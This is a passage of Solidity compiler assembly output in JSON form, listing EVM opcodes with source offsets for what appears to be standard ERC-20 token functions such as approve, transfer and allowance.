											"begin": 4661,
											"end": 4693,
											"name": "MSTORE"
										},
										{
											"begin": 4661,
											"end": 4693,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 4661,
											"end": 4693,
											"name": "ADD"
										},
										{
											"begin": 4661,
											"end": 4693,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 4661,
											"end": 4693,
											"name": "KECCAK256"
										},
										{
											"begin": 4661,
											"end": 4693,
											"name": "SLOAD"
										},
										{
											"begin": 4661,
											"end": 4697,
											"name": "PUSH [tag]",
											"value": "44"
										},
										{
											"begin": 4661,
											"end": 4697,
											"name": "SWAP1"
										},
										{
											"begin": 4661,
											"end": 4714,
											"name": "SWAP2"
										},
										{
											"begin": 4661,
											"end": 4714,
											"name": "SWAP1"
										},
										{
											"begin": 4661,
											"end": 4714,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 4661,
											"end": 4714,
											"name": "AND"
										},
										{
											"begin": 4661,
											"end": 4714,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 4661,
											"end": 4714,
											"name": "tag",
											"value": "52"
										},
										{
											"begin": 4661,
											"end": 4714,
											"name": "JUMPDEST"
										},
										{
											"begin": 4631,
											"end": 4639,
											"name": "PUSH [tag]",
											"value": "37"
										},
										{
											"begin": 4631,
											"end": 4715,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 4631,
											"end": 4715,
											"name": "tag",
											"value": "51"
										},
										{
											"begin": 4631,
											"end": 4715,
											"name": "JUMPDEST"
										},
										{
											"begin": 4733,
											"end": 4737,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 4726,
											"end": 4737,
											"name": "SWAP1"
										},
										{
											"begin": 4726,
											"end": 4737,
											"name": "POP"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "SWAP3"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "SWAP2"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "POP"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "POP"
										},
										{
											"begin": 4529,
											"end": 4745,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "tag",
											"value": "31"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "JUMPDEST"
										},
										{
											"begin": 2105,
											"end": 2109,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2122,
											"end": 2162,
											"name": "PUSH [tag]",
											"value": "54"
										},
										{
											"begin": 2132,
											"end": 2142,
											"name": "CALLER"
										},
										{
											"begin": 2144,
											"end": 2153,
											"name": "DUP5"
										},
										{
											"begin": 2155,
											"end": 2161,
											"name": "DUP5"
										},
										{
											"begin": 2122,
											"end": 2131,
											"name": "PUSH [tag]",
											"value": "41"
										},
										{
											"begin": 2122,
											"end": 2162,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2122,
											"end": 2162,
											"name": "tag",
											"value": "54"
										},
										{
											"begin": 2122,
											"end": 2162,
											"name": "JUMPDEST"
										},
										{
											"begin": 2180,
											"end": 2184,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 2173,
											"end": 2184,
											"name": "SWAP1"
										},
										{
											"begin": 2173,
											"end": 2184,
											"name": "POP"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "SWAP3"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "SWAP2"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "POP"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "POP"
										},
										{
											"begin": 2036,
											"end": 2192,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "tag",
											"value": "34"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "JUMPDEST"
										},
										{
											"begin": 2327,
											"end": 2334,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2354,
											"end": 2365,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 2354,
											"end": 2372,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2366,
											"end": 2371,
											"name": "DUP5"
										},
										{
											"begin": 2354,
											"end": 2372,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2354,
											"end": 2372,
											"name": "AND"
										},
										{
											"begin": 2354,
											"end": 2372,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2354,
											"end": 2372,
											"name": "AND"
										},
										{
											"begin": 2354,
											"end": 2372,
											"name": "DUP2"
										},
										{
											"begin": 2354,
											"end": 2372,
											"name": "MSTORE"
										},
										{
											"begin": 2354,
											"end": 2372,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2354,
											"end": 2372,
											"name": "ADD"
										},
										{
											"begin": 2354,
											"end": 2372,
											"name": "SWAP1"
										},
										{
											"begin": 2354,
											"end": 2372,
											"name": "DUP2"
										},
										{
											"begin": 2354,
											"end": 2372,
											"name": "MSTORE"
										},
										{
											"begin": 2354,
											"end": 2372,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2354,
											"end": 2372,
											"name": "ADD"
										},
										{
											"begin": 2354,
											"end": 2372,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2354,
											"end": 2372,
											"name": "KECCAK256"
										},
										{
											"begin": 2354,
											"end": 2381,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2373,
											"end": 2380,
											"name": "DUP4"
										},
										{
											"begin": 2354,
											"end": 2381,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2354,
											"end": 2381,
											"name": "AND"
										},
										{
											"begin": 2354,
											"end": 2381,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2354,
											"end": 2381,
											"name": "AND"
										},
										{
											"begin": 2354,
											"end": 2381,
											"name": "DUP2"
										},
										{
											"begin": 2354,
											"end": 2381,
											"name": "MSTORE"
										},
										{
											"begin": 2354,
											"end": 2381,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2354,
											"end": 2381,
											"name": "ADD"
										},
										{
											"begin": 2354,
											"end": 2381,
											"name": "SWAP1"
										},
										{
											"begin": 2354,
											"end": 2381,
											"name": "DUP2"
										},
										{
											"begin": 2354,
											"end": 2381,
											"name": "MSTORE"
										},
										{
											"begin": 2354,
											"end": 2381,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2354,
											"end": 2381,
											"name": "ADD"
										},
										{
											"begin": 2354,
											"end": 2381,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2354,
											"end": 2381,
											"name": "KECCAK256"
										},
										{
											"begin": 2354,
											"end": 2381,
											"name": "SLOAD"
										},
										{
											"begin": 2347,
											"end": 2381,
											"name": "SWAP1"
										},
										{
											"begin": 2347,
											"end": 2381,
											"name": "POP"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "SWAP3"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "SWAP2"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "POP"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "POP"
										},
										{
											"begin": 2255,
											"end": 2389,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 7070,
											"end": 7405,
											"name": "tag",
											"value": "37"
										},
										{
											"begin": 7070,
											"end": 7405,
											"name": "JUMPDEST"
										},
										{
											"begin": 7180,
											"end": 7181,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 7163,
											"end": 7182,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 7163,
											"end": 7182,
											"name": "AND"
										},
										{
											"begin": 7163,
											"end": 7168,
											"name": "DUP4"
										},
										{
											"begin": 7163,
											"end": 7182,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 7163,
											"end": 7182,
											"name": "AND"
										},
										{
											"begin": 7163,
											"end": 7182,
											"name": "EQ"
										},
										{
											"begin": 7163,
											"end": 7182,
											"name": "ISZERO"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "PUSH [tag]",
											"value": "57"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "JUMPI"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "MLOAD"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "PUSH",
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "DUP2"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "MSTORE"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "ADD"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "DUP1"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "DUP1"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "ADD"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "DUP3"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "DUP2"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "SUB"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "DUP3"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "MSTORE"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "DUP2"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "MSTORE"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "ADD"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "DUP1"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "PUSH data",
											"value": "C953F4879035ED60E766B34720F656AAB5C697B141D924C283124ECEDB91C208"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "SWAP2"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "CODECOPY"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "ADD"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "SWAP2"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "POP"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "POP"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "MLOAD"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "DUP1"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "SWAP2"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "SUB"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "SWAP1"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "REVERT"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "tag",
											"value": "57"
										},
										{
											"begin": 7155,
											"end": 7223,
											"name": "JUMPDEST"
										},
										{
											"begin": 7261,
											"end": 7262,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 7242,
											"end": 7263,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 7242,
											"end": 7263,
											"name": "AND"
										},
										{
											"begin": 7242,
											"end": 7249,
											"name": "DUP3"
										},
										{
											"begin": 7242,
											"end": 7263,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 7242,
											"end": 7263,
											"name": "AND"
										},
										{
											"begin": 7242,
											"end": 7263,
											"name": "EQ"
										},
										{
											"begin": 7242,
											"end": 7263,
											"name": "ISZERO"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "PUSH [tag]",
											"value": "58"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "JUMPI"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "MLOAD"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "PUSH",
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "DUP2"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "MSTORE"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "ADD"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "DUP1"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "DUP1"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "ADD"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "DUP3"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "DUP2"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "SUB"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "DUP3"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "MSTORE"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "PUSH",
											"value": "22"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "DUP2"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "MSTORE"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "ADD"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "DUP1"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "PUSH data",
											"value": "24883CC5FE64ACE9D0DF1893501ECB93C77180F0FF69CCA79AFFB3C316DC8029"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "PUSH",
											"value": "22"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "SWAP2"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "CODECOPY"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "ADD"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "SWAP2"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "POP"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "POP"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "MLOAD"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "DUP1"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "SWAP2"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "SUB"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "SWAP1"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "REVERT"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "tag",
											"value": "58"
										},
										{
											"begin": 7234,
											"end": 7302,
											"name": "JUMPDEST"
										},
										{
											"begin": 7345,
											"end": 7350,
											"name": "DUP1"
										},
										{
											"begin": 7315,
											"end": 7326,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 7315,
											"end": 7333,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 7327,
											"end": 7332,
											"name": "DUP6"
										},
										{
											"begin": 7315,
											"end": 7333,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 7315,
											"end": 7333,
											"name": "AND"
										},
										{
											"begin": 7315,
											"end": 7333,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 7315,
											"end": 7333,
											"name": "AND"
										},
										{
											"begin": 7315,
											"end": 7333,
											"name": "DUP2"
										},
										{
											"begin": 7315,
											"end": 7333,
											"name": "MSTORE"
										},
										{
											"begin": 7315,
											"end": 7333,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 7315,
											"end": 7333,
											"name": "ADD"
										},
										{
											"begin": 7315,
											"end": 7333,
											"name": "SWAP1"
										},
										{
											"begin": 7315,
											"end": 7333,
											"name": "DUP2"
										},
										{
											"begin": 7315,
											"end": 7333,
											"name": "MSTORE"
										},
										{
											"begin": 7315,
											"end": 7333,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 7315,
											"end": 7333,
											"name": "ADD"
										},
										{
											"begin": 7315,
											"end": 7333,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 7315,
											"end": 7333,
											"name": "KECCAK256"
										},
										{
											"begin": 7315,
											"end": 7342,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 7334,
											"end": 7341,
											"name": "DUP5"
										},
										{
											"begin": 7315,
											"end": 7342,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 7315,
											"end": 7342,
											"name": "AND"
										},
										{
											"begin": 7315,
											"end": 7342,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 7315,
											"end": 7342,
											"name": "AND"
										},
										{
											"begin": 7315,
											"end": 7342,
											"name": "DUP2"
										},
										{
											"begin": 7315,
											"end": 7342,
											"name": "MSTORE"
										},
										{
											"begin": 7315,
											"end": 7342,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 7315,
											"end": 7342,
											"name": "ADD"
										},
										{
											"begin": 7315,
											"end": 7342,
											"name": "SWAP1"
										},
										{
											"begin": 7315,
											"end": 7342,
											"name": "DUP2"
										},
										{
											"begin": 7315,
											"end": 7342,
											"name": "MSTORE"
										},
										{
											"begin": 7315,
											"end": 7342,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 7315,
											"end": 7342,
											"name": "ADD"
										},
										{
											"begin": 7315,
											"end": 7342,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 7315,
											"end": 7342,
											"name": "KECCAK256"
										},
										{
											"begin": 7315,
											"end": 7350,
											"name": "DUP2"
										},
										{
											"begin": 7315,
											"end": 7350,
											"name": "SWAP1"
										},
										{
											"begin": 7315,
											"end": 7350,
											"name": "SSTORE"
										},
										{
											"begin": 7315,
											"end": 7350,
											"name": "POP"
										},
										{
											"begin": 7382,
											"end": 7389,
											"name": "DUP2"
										},
										{
											"begin": 7366,
											"end": 7397,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 7366,
											"end": 7397,
											"name": "AND"
										},
										{
											"begin": 7375,
											"end": 7380,
											"name": "DUP4"
										},
										{
											"begin": 7366,
											"end": 7397,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 7366,
											"end": 7397,
											"name": "AND"
										},
										{
											"begin": 7366,
											"end": 7397,
											"name": "PUSH",
											"value": "8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925"
										},
										{
											"begin": 7391,
											"end": 7396,
											"name": "DUP4"
										},
										{
											"begin": 7366,
											"end": 7397,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 7366,
											"end": 7397,
											"name": "MLOAD"
										},
										{
											"begin": 7366,
											"end": 7397,
											"name": "DUP1"
										},
										{
											"begin": 7366,
											"end": 7397,
											"name": "DUP3"
										},
										{
											"begin": 7366,
											"end": 7397,
											"name": "DUP2"
										},
										{
											"begin": 7366,
											"end": 7397,
											"name": "MSTORE"
										},
										{
											"begin": 7366,
											"end": 7397,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 7366,
											"end": 7397,
											"name": "ADD"
										},
										{
											"begin": 7366,
											"end": 7397,
											"name": "SWAP2"
										},
										{
											"begin": 7366,
											"end": 7397,
											"name": "POP"
										},
										{
											"begin": 7366,
											"end": 7397,
											"name": "POP"
										},
										{
											"begin": 7366,
											"end": 7397,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 7366,
											"end": 7397,
											"name": "MLOAD"
										},
										{
											"begin": 7366,
											"end": 7397,
											"name": "DUP1"
										},
										{
											"begin": 7366,
											"end": 7397,
											"name": "SWAP2"
										},
										{
											"begin": 7366,
											"end": 7397,
											"name": "SUB"
										},
										{
											"begin": 7366,
											"end": 7397,
											"name": "SWAP1"
										},
										{
											"begin": 7366,
											"end": 7397,
											"name": "LOG3"
										},
										{
											"begin": 7070,
											"end": 7405,
											"name": "POP"
										},
										{
											"begin": 7070,
											"end": 7405,
											"name": "POP"
										},
										{
											"begin": 7070,
											"end": 7405,
											"name": "POP"
										},
										{
											"begin": 7070,
											"end": 7405,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 5138,
											"end": 5402,
											"name": "tag",
											"value": "41"
										},
										{
											"begin": 5138,
											"end": 5402,
											"name": "JUMPDEST"
										},
										{
											"begin": 5248,
											"end": 5277,
											"name": "PUSH [tag]",
											"value": "60"
										},
										{
											"begin": 5270,
											"end": 5276,
											"name": "DUP2"
										},
										{
											"begin": 5248,
											"end": 5257,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 5248,
											"end": 5265,
											"name": "DUP1"
										},
										{
											"begin": 5258,
											"end": 5264,
											"name": "DUP7"
										},
										{
											"begin": 5248,
											"end": 5265,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 5248,
											"end": 5265,
											"name": "AND"
										},
										{
											"begin": 5248,
											"end": 5265,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 5248,
											"end": 5265,
											"name": "AND"
										},
										{
											"begin": 5248,
											"end": 5265,
											"name": "DUP2"
										},
										{
											"begin": 5248,
											"end": 5265,
											"name": "MSTORE"
										},
										{
											"begin": 5248,
											"end": 5265,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 5248,
											"end": 5265,
											"name": "ADD"
										},
										{
											"begin": 5248,
											"end": 5265,
											"name": "SWAP1"
										},
										{
											"begin": 5248,
											"end": 5265,
											"name": "DUP2"
										},
										{
											"begin": 5248,
											"end": 5265,
											"name": "MSTORE"
										},
										{
											"begin": 5248,
											"end": 5265,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 5248,
											"end": 5265,
											"name": "ADD"
										},
										{
											"begin": 5248,
											"end": 5265,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 5248,
											"end": 5265,
											"name": "KECCAK256"
										},
										{
											"begin": 5248,
											"end": 5265,
											"name": "SLOAD"
										},
										{
											"begin": 5248,
											"end": 5269,
											"name": "PUSH [tag]",
											"value": "44"
										},
										{
											"begin": 5248,
											"end": 5269,
											"name": "SWAP1"
										},
										{
											"begin": 5248,
											"end": 5277,
											"name": "SWAP2"
										},
										{
											"begin": 5248,
											"end": 5277,
											"name": "SWAP1"
										},
										{
											"begin": 5248,
											"end": 5277,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 5248,
											"end": 5277,
											"name": "AND"
										},
										{
											"begin": 5248,
											"end": 5277,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 5248,
											"end": 5277,
											"name": "tag",
											"value": "60"
										},
										{
											"begin": 5248,
											"end": 5277,
											"name": "JUMPDEST"
										},
										{
											"begin": 5228,
											"end": 5237,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 5228,
											"end": 5245,
											"name": "DUP1"
										},
										{
											"begin": 5238,
											"end": 5244,
											"name": "DUP6"
										},
										{
											"begin": 5228,
											"end": 5245,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 5228,
											"end": 5245,
											"name": "AND"
										},
										{
											"begin": 5228,
											"end": 5245,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 5228,
											"end": 5245,
											"name": "AND"
										},
										{
											"begin": 5228,
											"end": 5245,
											"name": "DUP2"
										},
										{
											"begin": 5228,
											"end": 5245,
											"name": "MSTORE"
										},
										{
											"begin": 5228,
											"end": 5245,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 5228,
											"end": 5245,
											"name": "ADD"
										},
										{
											"begin": 5228,
											"end": 5245,
											"name": "SWAP1"
										},
										{
											"begin": 5228,
											"end": 5245,
											"name": "DUP2"
										},
										{
											"begin": 5228,
											"end": 5245,
											"name": "MSTORE"
										},
										{
											"begin": 5228,
											"end": 5245,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 5228,
											"end": 5245,
											"name": "ADD"
										},
										{
											"begin": 5228,
											"end": 5245,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 5228,
											"end": 5245,
											"name": "KECCAK256"
										},
										{
											"begin": 5228,
											"end": 5277,
											"name": "DUP2"
										},
										{
											"begin": 5228,
											"end": 5277,
											"name": "SWAP1"
										},
										{
											"begin": 5228,
											"end": 5277,
											"name": "SSTORE"
										},
										{
											"begin": 5228,
											"end": 5277,
											"name": "POP"
										},
										{
											"begin": 5311,
											"end": 5343,
											"name": "PUSH [tag]",
											"value": "61"
										},
										{
											"begin": 5336,
											"end": 5342,
											"name": "DUP2"
										},
										{
											"begin": 5311,
											"end": 5320,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 5311,
											"end": 5331,
											"name": "DUP1"
										},
										{
											"begin": 5321,
											"end": 5330,
											"name": "DUP6"
										},
										{
											"begin": 5311,
											"end": 5331,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 5311,
											"end": 5331,
											"name": "AND"
										},
										{
											"begin": 5311,
											"end": 5331,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 5311,
											"end": 5331,
											"name": "AND"
										},
										{
											"begin": 5311,
											"end": 5331,
											"name": "DUP2"
										},
										{
											"begin": 5311,
											"end": 5331,
											"name": "MSTORE"
										},
										{
											"begin": 5311,
											"end": 5331,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 5311,
											"end": 5331,
											"name": "ADD"
										},
										{
											"begin": 5311,
											"end": 5331,
											"name": "SWAP1"
										},
										{
											"begin": 5311,
											"end": 5331,
											"name": "DUP2"
										},
										{
											"begin": 5311,
											"end": 5331,
											"name": "MSTORE"
										},
										{
											"begin": 5311,
											"end": 5331,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 5311,
											"end": 5331,
											"name": "ADD"
										},
										{
											"begin": 5311,
											"end": 5331,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 5311,
											"end": 5331,
											"name": "KECCAK256"
										},
										{
											"begin": 5311,
											"end": 5331,
											"name": "SLOAD"
										},
										{
											"begin": 5311,
											"end": 5335,
											"name": "PUSH [tag]",
											"value": "48"
										},
										{
											"begin": 5311,
											"end": 5335,
											"name": "SWAP1"
										},
										{
											"begin": 5311,
											"end": 5343,
											"name": "SWAP2"
										},
										{
											"begin": 5311,
											"end": 5343,
											"name": "SWAP1"
										},
										{
											"begin": 5311,
											"end": 5343,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 5311,
											"end": 5343,
											"name": "AND"
										},
										{
											"begin": 5311,
											"end": 5343,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 5311,
											"end": 5343,
											"name": "tag",
											"value": "61"
										},
										{
											"begin": 5311,
											"end": 5343,
											"name": "JUMPDEST"
										},
										{
											"begin": 5288,
											"end": 5297,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 5288,
											"end": 5308,
											"name": "DUP1"
										},
										{
											"begin": 5298,
											"end": 5307,
											"name": "DUP5"
										},
										{
											"begin": 5288,
											"end": 5308,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 5288,
											"end": 5308,
											"name": "AND"
										},
										{
											"begin": 5288,
											"end": 5308,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 5288,
											"end": 5308,
											"name": "AND"
										},
										{
											"begin": 5288,
											"end": 5308,
											"name": "DUP2"
										},
										{
											"begin": 5288,
											"end": 5308,
											"name": "MSTORE"
										},
										{
											"begin": 5288,
											"end": 5308,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 5288,
											"end": 5308,
											"name": "ADD"
										},
										{
											"begin": 5288,
											"end": 5308,
